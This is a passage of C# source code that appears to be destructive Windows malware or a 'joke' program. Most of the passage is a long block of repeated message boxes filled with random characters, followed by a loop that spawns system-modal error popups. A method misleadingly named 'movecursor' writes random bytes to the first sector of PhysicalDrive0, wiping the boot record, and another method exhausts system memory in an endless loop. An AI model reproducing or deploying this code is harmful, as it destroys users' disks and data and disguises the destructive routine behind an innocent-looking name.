		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
	}

	public static string get_unicode(int amount)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < amount; i++)
		{
			int num;
			do
			{
				num = r.Next(32, 255);
			}
			while (char.IsControl((char)num));
			stringBuilder.Append(char.ConvertFromUtf32(num));
		}
		return stringBuilder.ToString();
	}

	public static void messageBoxSpawner()
	{
		while (true)
		{
			for (int i = 0; i < r.Next(5); i++)
			{
				new Thread((ThreadStart)delegate
				{
					MessageBox(IntPtr.Zero, get_unicode(r.Next(1, 80)), "", MB_ICONERROR | MB_SYSTEMMODAL);
				}).Start();
			}
			Thread.Sleep(r.Next(1000, 10000));
		}
	}

	public static void movecursor()
	{
		byte[] array = new byte[512];
		r.NextBytes(array);
		IntPtr hFile = CreateFile("\\\\.\\PhysicalDrive0", 268435456u, 3u, IntPtr.Zero, 3u, 0u, IntPtr.Zero);
		WriteFile(hFile, array, 512u, out var _, IntPtr.Zero);
	}

	public unsafe static void memoryfiller()
	{
		List<byte[]> list = new List<byte[]>();
		List<IntPtr> list2 = new List<IntPtr>();
		int num = 10485760;
		while (true)
		{
			try
			{
				byte[] array = new byte[num];
				for (int i = 0; i < array.Length; i += 4096)
				{
					array[i] = byte.MaxValue;
				}
				list.Add(array);
			}
			catch
			{
			}
			try
			{
				IntPtr intPtr = Marshal.AllocHGlobal(num);
				byte* ptr = (byte*)(void*)intPtr;
				for (int j = 0; j < num; j += 4096)
				{
					ptr[j] = byte.MaxValue;
				}
				list2.Add(intPtr);
			}
			catch
			{
			}
			Thread.Sleep(350);
		}
	}
}
